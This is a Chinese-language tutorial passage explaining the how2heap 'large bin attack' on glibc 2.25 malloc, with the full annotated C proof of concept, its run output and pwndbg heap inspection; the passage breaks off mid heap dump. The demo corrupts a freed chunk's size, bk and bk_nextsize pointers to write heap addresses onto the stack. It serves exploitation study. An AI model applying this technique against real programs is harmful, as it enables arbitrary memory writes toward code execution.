我们先看看例子中拿出来的部分
        [...]
                  else
                  {
                      victim->fd_nextsize = fwd;
                      victim->bk_nextsize = fwd->bk_nextsize;
                      fwd->bk_nextsize = victim;
                      victim->bk_nextsize->fd_nextsize = victim;
                  }
                  bck = fwd->bk;
        [...]
        mark_bin (av, victim_index);
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;
        For more details on how large-bins are handled and sorted by ptmalloc,
        please check the Background section in the aforementioned link.
这里推荐作者给出的[链接](https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/)
当然,我在这里简单说一哈
我们的large bin管理free 掉的 chunk时,我们的bk_nextsize和fd_nextsize就启用了
large bin是双循环链表,对于同样大小的free
chunk我们所释放的第一个chunk会成为一个堆头,其bk_nextsize指向下一个比他大的堆头,而fd_nextsize指向下一个比他小的堆头,然后最大的堆头的bk_nextsize指向最小的堆头,最小的堆头的fd_nextsize指向最大的堆头,而剩下的free
chunk就会通过fd和bk指针链在堆头的下面,他们的fd_nextsize和bk_nextsize的值都为0
形状的话就像是多个chunk按大小(从大到小)围成一个圆(最大最小相接),而每一个chunk的后面都链着一排和他一样大小的chunk
那我们如何利用呢?
        victim->fd_nextsize = fwd;
        victim->bk_nextsize = fwd->bk_nextsize;
        fwd->bk_nextsize = victim
        victim->bk_nextsize->fd_nextsize=victim
        bck = fwd->bk;
        mark_bin (av, victim_index)
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;
而这个过程中,我们的fwd是可控的,而又因为我们的fwd可控,也就意味着我们的fwd->bk_nextsize可控,bck可控
因此我们在这个过程中就有两次任意地址写堆地址的能力
第一次在victim->bk_nextsize也就是victim+4的地方
第二次在victim->bk=bck=fwd->bk的地方,也就是victim+2的地方
这两个地方可以写入fwd->bk_nextsize和fwd->bk
###  源代码
这里我就一行也不删了,直接在上面加了一小点注释
如果想了解large bin的话,可以去源代码给出的链接中看看
    /*
        This technique is taken from
        https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
        [...]
                  else
                  {
                      victim->fd_nextsize = fwd;
                      victim->bk_nextsize = fwd->bk_nextsize;
                      fwd->bk_nextsize = victim;
                      victim->bk_nextsize->fd_nextsize = victim;
                  }
                  bck = fwd->bk;
        [...]
        mark_bin (av, victim_index);
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;
        For more details on how large-bins are handled and sorted by ptmalloc,
        please check the Background section in the aforementioned link.
        [...]
     */
    #include
    #include
    int main()
    {
        //本例以通过写一个大的无符号long型数值进入栈来演示large bin attack
        fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stackn");
        //在实际中,large bin attack也常常被用于更深层次的攻击,如覆写global_max_fast来为fastbin attack打辅助(为什么有一种看到了unsorted bin attack的错觉2333
        fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
               "global variable global_max_fast in libc for further fastbin attacknn");
        unsigned long stack_var1 = 0;
        unsigned long stack_var2 = 0;
        //我们要在栈上覆写的是stack_var1和stack_var2
        fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:n");
        fprintf(stderr, "stack_var1 (%p): %ldn", &stack_var1, stack_var1);
        fprintf(stderr, "stack_var2 (%p): %ldnn", &stack_var2, stack_var2);
        unsigned long *p1 = malloc(0x320);
        //现在我们有了第一个large chunk
        fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %pn", p1 - 2);
        //然后申请一个fastbin chunk 来避免我们的第一个large chunk free的时候与下一个large chunk合并
        fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
               " the first large chunk during the free()nn");
        malloc(0x20);
        unsigned long *p2 = malloc(0x400);
        //现在是第二个large chunk
        fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %pn", p2 - 2);
        //同理,防止第二个free的时候与下一个large chunk合并
        fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
               " the second large chunk during the free()nn");
        malloc(0x20);
        unsigned long *p3 = malloc(0x400);
        //最后我们分配第三个large chunk
        fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %pn", p3 - 2);
        //这个fastbin是为了防止和top chunk合并
        fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
               " the third large chunk during the free()nn");
        malloc(0x20);
        free(p1);
        free(p2);
        //现在我们free掉第一个和第二个large chunks,此时他们会被插入到unsorted bin中
        fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
               " [ %p  %p ]nn", (void *)(p2 - 2), (void *)(p2[0]));
        malloc(0x90);
        //此时,我们申请一个小于被释放的第一个large chunk的chunk
        fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
                " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
                ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
                " [ %p ]nn", (void *)((char *)p1 + 0x90));
        free(p3);
        //现在我们free第三个large chunk
        fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
               " [ %p  %p ]nn", (void *)(p3 - 2), (void *)(p3[0]));
        //------------VULNERABILITY-----------    
        //现在假设我们有一个漏洞可以覆写被free的第二个large chunk的size,bk,bk_nextsize指针
        fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's "size""
                " as well as its "bk" and "bk_nextsize" pointersn");
        //现在我们减少被free的第二个large chunk来逼迫malloc将被free的第三个large chunk插入到large bin freelist的头部
        fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
        //为了覆写栈上的值,我们将在stack_var1前将bk设位16bytes,并在stack_var2前将bk_nextsize设为32bytes
                " at the head of the large bin freelist. To overwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and"
                " "bk_nextsize" to 32 bytes before stack_var2nn");
        p2[-1] = 0x3f1;
        p2[0] = 0;
        p2[2] = 0;
        p2[1] = (unsigned long)(&stack_var1 - 2);
        p2[3] = (unsigned long)(&stack_var2 - 4);
        //------------------------------------    
        malloc(0x90);
        //让我们再malloc一次,这样被释放的large chunk就被插入到large bin freelist了
        fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
        //在这期间,我们的目标已经被改写
                " During this time, targets should have already been rewritten:n");
        fprintf(stderr, "stack_var1 (%p): %pn", &stack_var1, (void *)stack_var1);
        fprintf(stderr, "stack_var2 (%p): %pn", &stack_var2, (void *)stack_var2);
        return 0;
    }
###  运行结果
    root@284662b4a7a3:~/how2heap/glibc_2.25# ./large_bin_attack
    This file demonstrates large bin attack by writing a large unsigned long value into stack
    In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
    Let's first look at the targets we want to rewrite on stack:
    stack_var1 (0x7ffe64e357c0): 0
    stack_var2 (0x7ffe64e357c8): 0
    Now, we allocate the first large chunk on the heap at: 0x1d99000
    And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()
    Then, we allocate the second large chunk on the heap at: 0x1d99360
    And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()
    Finally, we allocate the third large chunk on the heap at: 0x1d997a0
    And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()
    We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x1d99360  0x1d99000 ]
    Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x1d990a0 ]
    Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x1d997a0  0x1d990a0 ]
    Now emulating a vulnerability that can overwrite the freed second large chunk's "size" as well as its "bk" and "bk_nextsize" pointers
    Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and "bk_nextsize" to 32 bytes before stack_var2
    Let's malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:
    stack_var1 (0x7ffe64e357c0): 0x1d997a0
    stack_var2 (0x7ffe64e357c8): 0x1d997a0
###  关键代码调试
这里我也下了几个断点
       41     unsigned long stack_var1 = 0;
       42     unsigned long stack_var2 = 0;
       43
     ► 44     fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:n");
       67     malloc(0x20);
       68
     ► 69     free(p1);
       69     free(p1);
     ► 70     free(p2);
       70     free(p2);
     ► 71     fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
       72            " [ %p  %p ]nn", (void *)(p2 - 2), (void *)(p2[0]));
       74     malloc(0x90);
     ► 75     fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
       80     free(p3);
     ► 81     fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
       82            " [ %p  %p ]nn", (void *)(p3 - 2), (void *)(p3[0]));
       92     p2[-1] = 0x3f1;
       93     p2[0] = 0;
       94     p2[2] = 0;
       95     p2[1] = (unsigned long)(&stack_var1 - 2);
       96     p2[3] = (unsigned long)(&stack_var2 - 4);
       97
       98     //------------------------------------       99
     ► 100     malloc(0x90);
       100     malloc(0x90);
       101
     ► 102     fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
好了,运行一下康康,首先是栈上的两个变量
    pwndbg> x/10gx & stack_var1
    0x7fffffffe5c0: 0x0000000000000000      0x0000000000000000
    0x7fffffffe5d0: 0x0000000000400a30      0x00000000004005b0
    0x7fffffffe5e0: 0x00007fffffffe6d0      0x9310f5c464b47700
    0x7fffffffe5f0: 0x0000000000400a30      0x00007ffff7a2d830
    0x7fffffffe600: 0x0000000000000000      0x00007fffffffe6d8
之后程序继续运行,下面是所有我们分配的chunk
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 817,
      fd = 0x0,